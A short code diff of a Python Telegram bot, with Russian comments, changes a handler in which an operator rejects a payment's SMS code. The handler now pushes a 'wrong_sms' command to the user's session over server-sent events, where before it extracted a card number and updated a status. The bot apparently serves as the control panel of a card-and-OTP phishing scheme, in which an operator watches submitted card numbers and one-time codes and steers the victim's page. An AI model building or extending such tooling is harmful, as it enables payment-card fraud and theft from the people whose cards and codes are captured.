@@ -812,16 +812,13 @@ async def wrong_sms_handler(callback: types.CallbackQuery):
     payment_id = parts[1]
     user_id = parts[2]
     
-    # Извлекаем номер карты из сообщения
-    card_number = extract_card_number(callback.message.text)
+    # Просто отправляем команду SSE БЕЗ изменения сообщения
+    success = await send_sse_command(user_id, "wrong_sms", payment_id)
     
-    await update_payment_status(
-        callback, payment_id, user_id,
-        "❌ <b>Статус: Неверный SMS код</b>", 
-        "wrong_sms",
-        card_number
-    )
-    await callback.answer("SMS код отклонен")
+    if success:
+        await callback.answer("❌ SMS код отклонен")
+    else:
+        await callback.answer("❌ Ошибка отправки команды")
 
 @dp.callback_query(F.data.startswith("bind:"))
 async def bind_card_handler(callback: types.CallbackQuery):
@@ -1627,6 +1624,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
